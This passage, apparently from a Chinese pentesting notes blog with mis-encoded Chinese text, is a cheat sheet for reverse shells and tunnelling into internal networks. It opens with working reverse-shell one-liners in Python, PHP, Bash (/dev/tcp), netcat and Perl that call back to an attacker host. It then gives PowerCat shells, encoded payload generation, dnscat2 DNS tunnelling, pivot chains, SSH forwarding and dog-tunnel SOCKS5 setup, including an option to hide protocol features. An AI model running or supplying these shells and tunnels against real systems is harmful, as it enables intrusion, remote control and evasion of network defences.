<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">python -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>VPS<span class="string">&quot;,6666))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>PHP</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                     $sock = fsockopen(<span class="string">&quot;ip&quot;</span>,port);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line">  </span><br><span class="line"> php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.90.93/9999 0&gt;&amp;1ï¼ˆå†…ç½‘ä¸»æœºæ‰§è¡Œï¼‰</span><br><span class="line">nc -lvv -p 5555ï¼ˆå…¬ç½‘ä¸»æœºæ‰§è¡Œï¼‰</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.90.93/9999 0&gt;&amp;1</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">ncat -lvv -p 10000 -e /bin/bash (nc -lvv -p 6666 -c bash)</span><br><span class="line">nc -n ip port</span><br><span class="line"></span><br><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">nc -nv ip port -c bash</span><br><span class="line">nc -lvv -p port</span><br></pre></td></tr></table></figure>

<ul>
<li>Per</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h3><p>æ ¹æ®åç§°å³å¯çŸ¥é“ï¼Œå¯é…åˆNetcatä¹Ÿå¯å•ç‹¬ç”¨ã€‚ï¼ˆä¸è¿‡æ€è½¯ï¼‰</p>
<blockquote>
<p>Set-ExecutionPolicy Unrestricted  # è®¾ç½®å…è®¸æ‰€æœ‰psè„šæœ¬</p>
</blockquote>
<blockquote>
<p>Import-Module powerboat.ps1  # å¯¼å…¥</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ°å€ï¼šhttps:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1</span><br><span class="line">ä½¿ç”¨æ–¹æ³•</span><br></pre></td></tr></table></figure>

<h4 id="å‚æ•°ï¼š"><a href="#å‚æ•°ï¼š" class="headerlink" title="å‚æ•°ï¼š"></a>å‚æ•°ï¼š</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="literal">-l</span> <span class="comment"># ç›‘å¬æ¨¡å¼</span></span><br><span class="line"><span class="literal">-p</span> <span class="comment"># ç«¯å£</span></span><br><span class="line"><span class="literal">-e</span> <span class="comment"># æŒ‡å®šè¦å¯åŠ¨çš„è¿›ç¨‹çš„åç§°</span></span><br><span class="line"><span class="literal">-v</span> <span class="comment"># æ˜¾ç¤ºè¯¦æƒ…</span></span><br><span class="line"><span class="literal">-ep</span> <span class="comment"># è¿”å›powershell</span></span><br><span class="line"><span class="literal">-c</span> <span class="comment"># æŒ‡å®šè¿æ¥çš„IPåœ°å€</span></span><br><span class="line"><span class="literal">-of</span> <span class="comment"># æŒ‡å®šæ¥å—æ–‡ä»¶åçš„è¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line"><span class="literal">-i</span> <span class="comment"># è¾“å…¥ å¯å†™æ–‡ä»¶åï½œå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="literal">-g</span> <span class="comment"># ç”Ÿæˆpayload</span></span><br><span class="line"><span class="operator">-ge</span> <span class="comment"># ç¼–ç </span></span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡NCçš„æ­£å‘è¿æ¥PowerCat.  (æœ¬åœ°win10æµ‹è¯•é€šè¿‡)</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span>			<span class="comment"># å¯ä»¥æŒ‡å®špowershell</span></span><br><span class="line">		</span><br><span class="line">nc ip <span class="number">8080</span> <span class="literal">-vv</span>			<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡ncåå‘è¿æ¥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvv -p 8888</span><br><span class="line"></span><br><span class="line">powercat -c ip -p port -v -e cmd.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡powercatè¿”å›powershell </li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> port <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-v</span> <span class="literal">-ep</span></span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡powercatä¼ è¾“æ–‡ä»¶</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">9999</span> <span class="literal">-of</span> test.txt <span class="literal">-v</span>  <span class="comment"># æ¥å—</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-i</span> c:\test.txt <span class="literal">-v</span>   <span class="comment"># å‘é€</span></span><br></pre></td></tr></table></figure>

<h4 id="ç”ŸæˆPayload"><a href="#ç”ŸæˆPayload" class="headerlink" title="ç”ŸæˆPayload"></a>ç”ŸæˆPayload</h4><p>ç”¨powercatç”Ÿæˆçš„payloadæœ‰æ­£ååŒºåˆ†ä¸”å¯ä»¥å¯¹å…¶ç¼–ç </p>
<ul>
<li>ç®€å•payloadç”Ÿæˆ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-e</span> cmd <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># å°†å…¶è¾“å‡ºåˆ°æ–‡ä»¶æ‰§è¡Œ</span></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-ep</span> <span class="operator">-ge</span>	<span class="comment"># ç”Ÿæˆç¼–ç çš„payload</span></span><br></pre></td></tr></table></figure>

<h4 id="DNSéš§é“é€šä¿¡"><a href="#DNSéš§é“é€šä¿¡" class="headerlink" title="DNSéš§é“é€šä¿¡"></a>DNSéš§é“é€šä¿¡</h4><p>å…¶DNSé€šä¿¡åŸºäºdnscatï¼Œå› æ­¤å…¶æœåŠ¡ç«¯éœ€è¦dnscatã€‚å¦‚æœå®åœ¨ä¸èƒ½å®‰è£…ï¼Œå‚è€ƒå®˜ç½‘ã€‚ã€‚ã€‚</p>
<p>è¿™é‡Œä»…ä»…æ˜¯Debian Linuxã€‚å®¢æˆ·ç«¯makeæ—¶å€™æŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“ã€‚ã€‚ã€‚å¯ä»¥./dnscatæµ‹è¯•ä¸€ä¸‹æ˜¯å¦æ­£å¸¸ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡ç«¯</span></span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯</span></span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ruby ./dnscat2.rb ttpowercat.test <span class="literal">-e</span> open -<span class="literal">-no</span><span class="literal">-cache</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-dns</span> ttpowercat.test <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="è·³æ¿"><a href="#è·³æ¿" class="headerlink" title="è·³æ¿"></a>è·³æ¿</h4><ul>
<li>TCP</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¬¬ä¸€å°ï¼šç›®æ ‡æœº</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-v</span> <span class="literal">-p</span> <span class="number">9999</span> <span class="literal">-e</span> cmd.exe   </span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬äºŒå°ï¼šè·³æ¿æœº</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-v</span> <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-r</span> tcp:ç›®æ ‡æœºåœ°å€:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬ä¸‰å°:æ”»å‡»è€…</span></span><br><span class="line">nc è·³æ¿æœºåœ°å€ <span class="number">8000</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure>

<ul>
<li>DNS</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è·³æ¿æœº</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-r</span> dns:æ”»å‡»è€…::ttpowercat.test</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”»å‡»è€…</span></span><br><span class="line">./dnscat2.rb ttpowercat.test <span class="literal">-e</span> open -<span class="literal">-no</span><span class="literal">-cache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœº</span></span><br><span class="line">powercat <span class="literal">-c</span> è·³æ¿æœº <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-C <span class="comment"># å‹ç¼©ä¼ è¾“ï¼Œæé«˜é€Ÿåº¦</span></span><br><span class="line">-f <span class="comment"># SShä¼ è¾“è½¬åˆ°åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰shell</span></span><br><span class="line">-N <span class="comment"># å»ºç«‹é™é»˜è¿æ¥(å»ºç«‹è¿æ¥ï¼Œçœ‹ä¸åˆ°ä¼šè¯)</span></span><br><span class="line">-g <span class="comment"># å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£</span></span><br><span class="line">-L <span class="comment"># æœ¬åœ°ç«¯å£è½¬å‘</span></span><br><span class="line">-R <span class="comment"># è¿œç¨‹ç«¯å£è½¬å‘</span></span><br><span class="line">-D <span class="comment"># åŠ¨æ€è½¬å‘(SOCKSä»£ç†)</span></span><br><span class="line">-P <span class="comment"># æŒ‡å®šSSHç«¯å£</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æœ¬åœ°è½¬å‘</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CFNg -L port(VPS):ip(ç›®æ ‡æœº):port(ç›®æ ‡æœº) root@ip(è·³æ¿æœº) </span><br><span class="line"><span class="comment"># VPSæ‰§è¡Œï¼Œå°†ç›®æ ‡æœºç«¯å£è½¬åˆ°VPS</span></span><br></pre></td></tr></table></figure>

<ul>
<li>è¿œç¨‹ç«¯å£è½¬å‘</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CFNg -R port(VPS):ip(ç›®æ ‡æœº):port(ç›®æ ‡æœº) root@ip(vps) </span><br><span class="line"><span class="comment"># å†…ç½‘è·³æ¿æœºæ‰§è¡Œï¼Œå°†å†…ç½‘ç›®æ ‡æœºçš„ç«¯å£è½¬åˆ°VPSç«¯å£</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åŠ¨æ€è½¬å‘</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CFNg -D port(VPS) root@ip(è·³æ¿æœº)</span><br><span class="line"><span class="comment"># SOCK4/5ä»£ç†</span></span><br></pre></td></tr></table></figure>

<h3 id="dog-tunnel-lite"><a href="#dog-tunnel-lite" class="headerlink" title="dog-tunnel-lite"></a>dog-tunnel-lite</h3><h4 id="Linuxç¼–è¯‘"><a href="#Linuxç¼–è¯‘" class="headerlink" title="Linuxç¼–è¯‘"></a>Linuxç¼–è¯‘</h4><blockquote>
<p> æˆ‘çš„Linuxä¸ºdebian_8_x64</p>
</blockquote>
<ul>
<li>é¦–å…ˆæ ¹æ®Githubå®˜æ–¹çš„æ–‡æ¡£ï¼Œè¿›è¡ŒLinuxç‰ˆæœ¬ç¼–è¯‘x64ã€‚</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get github.com/klauspost/reedsolomon</span><br><span class="line">go get github.com/cznic/zappy</span><br><span class="line">go get -u -d github.com/vzex/dog-tunnel &amp;&amp; cd $GOPATH/src/github.com/vzex/dog-tunnel/ &amp;&amp; git checkout udpVersion &amp;&amp; make</span><br><span class="line"><span class="meta">#</span><span class="bash"> æ³¨æ„git checkout udpVersion è¿™ä¸ªæ‰æ˜¯dog-tunnel-lite,å¦‚æœgit checkout masteråˆ™æ˜¯dog-tunnel</span></span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘æˆåŠŸä¹‹åï¼Œä¼šåœ¨<code>/usr/local/gopackage/src/github.com/vzex/dog-tunnel</code>æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆå¦‚ä¸‹ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@pq:&#x2F;usr&#x2F;local&#x2F;gopackage&#x2F;src&#x2F;github.com&#x2F;vzex# tree dog-tunnel&#x2F;</span><br><span class="line">dog-tunnel&#x2F;</span><br><span class="line">â”œâ”€â”€ client.go</span><br><span class="line">â”œâ”€â”€ common</span><br><span class="line">â”‚   â”œâ”€â”€ cache.go</span><br><span class="line">â”‚   â”œâ”€â”€ cache_test.go</span><br><span class="line">â”‚   â””â”€â”€ common.go</span><br><span class="line">â”œâ”€â”€ dog-tunnel.png</span><br><span class="line">â”œâ”€â”€ dtunnel_lite</span><br><span class="line">â”œâ”€â”€ HowToUse.txt</span><br><span class="line">â”œâ”€â”€ ikcp</span><br><span class="line">â”‚   â”œâ”€â”€ ikcp.go</span><br><span class="line">â”‚   â”œâ”€â”€ ikcp_h.go</span><br><span class="line">â”‚   â”œâ”€â”€ ikcp_test.go</span><br><span class="line">â”‚   â””â”€â”€ ikcp_test_h.go</span><br><span class="line">â”œâ”€â”€ Makefile</span><br><span class="line">â”œâ”€â”€ pipe</span><br><span class="line">â”‚   â”œâ”€â”€ pipe.go</span><br><span class="line">â”‚   â””â”€â”€ pipe_test.go</span><br><span class="line">â”œâ”€â”€ platform</span><br><span class="line">â”‚   â”œâ”€â”€ platform_darwin.go</span><br><span class="line">â”‚   â”œâ”€â”€ platform_unix.go</span><br><span class="line">â”‚   â””â”€â”€ platform_win.go</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â””â”€â”€ release.sh</span><br><span class="line"></span><br><span class="line">4 directories, 19 files</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶çš„<code>dtunnel_lite</code>å³ä¸ºç¼–è¯‘å¥½çš„x64ç‰ˆæœ¬<code>dog-tunnel-lite</code>ç‰ˆã€‚</p>
<p>æœ¬åœ°ç¼–è¯‘æ—¶å€™å†…å­˜æº¢å‡ºã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æ”¾å¼ƒäº†</p>
<h4 id="Windowsç¼–è¯‘-x64"><a href="#Windowsç¼–è¯‘-x64" class="headerlink" title="Windowsç¼–è¯‘  x64"></a>Windowsç¼–è¯‘  x64</h4><blockquote>
<p>æˆ‘è¿™é‡Œæ—¶Windows7_x64 ã€‚</p>
</blockquote>
<ul>
<li>Windowsç¼–è¯‘å‰ç½®æ¡ä»¶</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1ã€go (æ·»åŠ ç¯å¢ƒå˜é‡)</span><br><span class="line"><span class="meta">#</span><span class="bash"> https://studygolang.com/dl  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://studygolang.com/dl/golang/go1.13.1.windows-amd64.msi</span></span><br><span class="line"></span><br><span class="line">2ã€mingw64(GCCç¼–è¯‘å™¨ï¼Œæ·»åŠ ç¯å¢ƒå˜é‡)</span><br><span class="line"><span class="meta">#</span><span class="bash"> https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/8.1.0/threads-posix/seh/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://nchc.dl.sourceforge.net/project/mingw-w64/Toolchains targetting Win64/Personal Builds/mingw-builds/8.1.0/threads-posix/seh/x86_64-8.1.0-release-posix-seh-rt_v6-rev0.7z</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰“å¼€CMD(ä»»æ„ç›®å½•)ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get github.com/klauspost/reedsolomon</span><br><span class="line">go get github.com/cznic/zappy</span><br><span class="line"><span class="meta">#</span><span class="bash"> å®‰è£…ä¾èµ–ï¼Œæˆ‘è¿™é‡Œä¸æ˜¯ä»¥ç®¡ç†å‘˜å‘½ä»¤æ‰§è¡Œçš„ã€‚å› æ­¤å®‰è£…ä»¥åæ–‡ä»¶åœ¨ï¼šC:\Users\aa\go\src\github.com\</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ç„¶åä¸‹è½½dog-tunnel-liteè¿›è¡Œç¼–è¯‘(æ³¨æ„è‡ªå·±çš„è·¯å¾„)ï¼š</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get -u -d github.com/vzex/dog-tunnel # ä¸‹è½½dog-tunnel</span><br><span class="line">cd C:\Users\aa\go\src\github.com\vzex\dog-tunnel  # åˆ‡æ¢åˆ°æ–‡ä»¶ä¸‹è½½ç›®å½•</span><br><span class="line">git checkout udpVersion  # é€‰æ‹©dog-tunnel-liteç‰ˆæœ¬(ä¹Ÿå³æ˜¯udpVersion)</span><br><span class="line">go build client.go</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘ç°<code>C:\Users\aa\go\src\github.com\vzex\dog-tunnel</code>å‡ºç°äº†client.exeå³dog-tunnel-lite_x64ã€‚</p>
<h4 id="windowsç¼–è¯‘-x86"><a href="#windowsç¼–è¯‘-x86" class="headerlink" title="windowsç¼–è¯‘ x86"></a>windowsç¼–è¯‘ x86</h4><ul>
<li><p>é¦–å…ˆå°†ä¹‹å‰ç”Ÿæˆçš„client.exeç§»åŠ¨åˆ°å…¶ä»–ç›®å½•æˆ–è€…åˆ é™¤ã€‚(ç´§æ¥ç€x64çš„ï¼Œæ³¨æ„ç›®å½•)</p>
</li>
<li><p>ä½¿ç”¨<code>go env</code>å‘½ä»¤,æŸ¥çœ‹ç³»ç»Ÿçš„é…ç½®ç¯å¢ƒ,å¯ä»¥çœ‹åˆ°GOARCH(å½“å‰ç³»ç»Ÿ)æ˜¯amd64</p>
</li>
<li><p>æ‰§è¡Œ <code>set GOARCH=386</code> é…ç½®goè¾“å‡ºç³»ç»Ÿå¹³å°ä¸º32ä½,ç„¶åæŸ¥çœ‹æ˜¯å¦æˆåŠŸã€‚(ä¸€ä¸‹æ“ä½œåœ¨å½“å‰çª—å£è¿›è¡Œæ“ä½œ)</p>
</li>
<li><p>go build client.goï¼Œå³å¯ï¼ŒæŸ¥çœ‹å±æ€§-&gt;å…¼å®¹æ€§-&gt;è®¾ç½®ï¼Œå…¶ä¸­ä¸ºå¯é€‰å³ä¸º32ä½ï¼Œwinhexåœ¨æ–‡ä»¶å¤´ä¸­èƒ½æ‰¾åˆ°<br>&gt;&gt;&gt;PE..d çš„æ˜¯64ä½<br>&gt;&gt;&gt;PE..L çš„æ˜¯32ä½</p>
</li>
<li><p>ç„¶åè¿˜åŸgo,æ‰§è¡Œ<code>set GOARCH=amd64</code></p>
</li>
</ul>
<h4 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h4><blockquote>
<p>æˆ‘ä¸ªäººä¸»è¦æ˜¯ä½¿ç”¨ç«¯å£è½¬å‘ä»¥åŠSocks5ä»£ç†ã€‚</p>
</blockquote>
<p>å…¶ä»–ç»†èŠ‚è¯·å‚è€ƒ<code>https://github.com/vzex/dog-tunnel/blob/lite_v1.41/HowToUse.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å‚æ•°è¯´æ˜  v1.20</span><br><span class="line">    æ‰€æœ‰å‚æ•°å‰é¢åŠ äº†c/så­—æ ·ï¼Œç”¨äºæè¿°å‚æ•°çš„å¯ä½¿ç”¨èŒƒå›´</span><br><span class="line">    cè¡¨ç¤ºåªèƒ½å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œsåªèƒ½æœåŠ¡ç«¯</span><br><span class="line">    csä»£è¡¨ä¸¤ç«¯å¿…é¡»ä¸€è‡´ c|sä»£è¡¨ä¸¤ç«¯éƒ½å¯ä»¥ç”¨ï¼Œå¯ä¸ä¿è¯ä¸€è‡´ï¼Œå…·ä½“ç”¨æ³•å‚è€ƒ--help</span><br><span class="line">-action æŒ‡æ˜é€šé“è¡Œä¸ºï¼Œé»˜è®¤socks5ï¼ˆsocks5ä»£ç†æœåŠ¡ï¼‰,å¯è®¾ç½®ip:portï¼Œä½œä¸ºç«¯å£è½¬å‘ç”¨ï¼Œå®¢æˆ·ç«¯å¯æŒ‡å®šè¯¥å‚æ•°ï¼Œå½“æœåŠ¡ç«¯æŒ‡å®šå‚æ•°æ—¶ä¼šå¼ºåˆ¶é‡‡ç”¨æœåŠ¡ç«¯ç­–ç•¥, æŒ‡å®šå‚æ•°routeå°†å¼€å¯é€æ˜ä»£ç†æ¨¡å¼ï¼Œwindowsç‰ˆæœ¬ä¸æ”¯æŒè¯¥æ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹è¯·è‡ªè¡Œè®¾ç½®ç”¨æˆ·çš„DNSå’Œç½‘å…³ï¼Œå°†éœ€è¦çš„tcpè¿æ¥é€šè¿‡iptablesè½¬å‘åˆ°-localç«¯å£å³å¯</span><br><span class="line">-auth ç”¨äºç®€å•çš„ç™»å½•éªŒè¯ï¼Œä¸¤ç«¯ä¸ä¸€è‡´æ—¶å®¢æˆ·ç«¯ä¼šè¢«æ–­å¼€</span><br><span class="line">-debug è°ƒè¯•è¾“å‡º,éœ€è¦å’Œ-vä¸€èµ·ä½¿ç”¨</span><br><span class="line">-dnscache (æœ‰åŠ é€Ÿæ•ˆæœ)å½“socks5(socks5_smart)æ¨¡å¼æ—¶æœ‰æ•ˆï¼ŒæŒ‡å®šdnsç¼“å­˜æ—¶é—´ï¼Œé»˜è®¤0ï¼Œå•ä½åˆ†é’Ÿ,socks5_smartæ¨¡å¼ä¸‹è¿‘ç«¯ä¹Ÿå¯æŒ‡å®šè¯¥å‚æ•°,å› ä¸ºä¼šæœ‰è¯·æ±‚é€šè¿‡è¿‘ç«¯è§£æ</span><br><span class="line">-encrypt å®¢æˆ·ç«¯æŒ‡å®šï¼Œè¡¨ç¤ºè¯¥é€šé“æ˜¯å¦å¯ç”¨æ¶ˆæ¯åŠ å¯†</span><br><span class="line">-local é€šé“è¿é€šæ—¶æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œæ ¼å¼ip:port</span><br><span class="line">-pipe (æœ‰åŠ é€Ÿæ•ˆæœ)é€šé“ä¸ªæ•°ï¼Œé»˜è®¤1</span><br><span class="line">-r åå‘æ¨¡å¼ï¼Œtrueæ—¶å®¢æˆ·ç«¯è§¦å‘actionè¡Œä¸ºï¼ŒæœåŠ¡ç«¯ç›‘å¬localæŒ‡å®šçš„ç«¯å£</span><br><span class="line">-service é€šé“æœåŠ¡ç«¯åœ°å€ï¼Œå®¢æˆ·ç«¯æŒ‡å®šæ—¶ä¸ºè¿æ¥åœ°å€ï¼ŒæœåŠ¡ç«¯æŒ‡å®šæ—¶ä¸ºç›‘å¬åœ°å€ï¼Œç”¨äºé€šé“æ‰“é€šï¼ŒåŒæ–¹åœ°å€ä¸€è‡´ï¼Œä¸€èˆ¬ä¸ºæœåŠ¡ç«¯ip:port</span><br><span class="line">-tcp tcpæ¨¡å¼ï¼Œé»˜è®¤falseï¼Œä½¿ç”¨udpæ¨¡å¼åœ¨ç½‘ç»œå·®çš„ç¯å¢ƒä¸‹æ•ˆç‡æ›´é«˜ï¼Œcpuå ç”¨ä¹Ÿæ›´é«˜(å¾…ä¼˜åŒ–),ä¸¤ç«¯éœ€ä¸€è‡´</span><br><span class="line">-timeout å®¢æˆ·ç«¯æ‰§è¡Œè¿æ¥è¶…æ—¶æ—¶é—´ï¼Œtcpæ¨¡å¼å…³é—­æ¨¡å¼æ—¶æœ‰æ•ˆ</span><br><span class="line">-v æ›´å¤šè¾“å‡ºä¿¡æ¯</span><br><span class="line">-version ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">-src è®°å½•æ¥æºipå’Œè®¿é—®ç›®çš„ip</span><br><span class="line"></span><br><span class="line">-xor ä¸¤ç«¯é¡»ä¸€è‡´ï¼Œç”¨äºudpæ¨¡å¼æ¡æ‰‹åŠ å¯†,å†…å®¹ä¸ºä»»æ„å­—ç¬¦ä¸²(ä¸»è¦ç”¨äºéšè—é€šè®¯åè®®ç‰¹å¾ï¼Œå»ºè®®è®¾ç½®)</span><br><span class="line">-session_timeout æŒ‡å®šè¿æ¥ä¼šè¯åœ¨ä¸æ´»è·ƒçŠ¶æ€æ—¶å¤šä¹…ï¼ˆç§’ï¼‰åè¢«é”€æ¯ï¼Œé˜²æ­¢è¢«åŠ¨è¿æ¥çš„æƒ…å†µä¸‹äº§ç”Ÿåƒµå°¸socketï¼Œé»˜è®¤0ä¸è‡ªåŠ¨é”€æ¯</span><br><span class="line">-kcp å¯è®¾ç½®kcpåè®®ç›¸å…³å‚æ•°ï¼Œé«˜çº§ç”¨æˆ·ä½¿ç”¨ï¼Œæ ¼å¼å‚è€ƒ-kcp nodelay:1;snd=100; </span><br></pre></td></tr></table></figure>

<ul>
<li>Socks5ä»£ç†(ä¸»è¦å†…ç½‘æµ‹è¯•ä¸­ç»å¸¸ç”¨)</li>
</ul>
<p>æœåŠ¡ç«¯(s,ä¹Ÿå³æ˜¯å…¬ç½‘ä¸»æœºè¿è¡Œå‘½ä»¤)ï¼Œè¿™é‡Œä¸ºLinuxï¼š</p>
<blockquote>
<p>ç›‘å¬1.2.3.4:1234ç«¯å£ã€‚æŒ‡å®šåŠ å¯†å­—ç¬¦ä¼ -xor ddd ,æŒ‡å®šéªŒè¯å­—ç¬¦ccc,æœåŠ¡ç«¯å¼ºåˆ¶å¯ç”¨ socks5ä»£ç†</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./dtunnel_lite -service 1.2.3.4:1234 -xor ddd -v -auth ccc -action socks5</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯(å†…ç½‘ä¸»æœº)è¿™é‡Œä¸ºwindows:</p>
<blockquote>
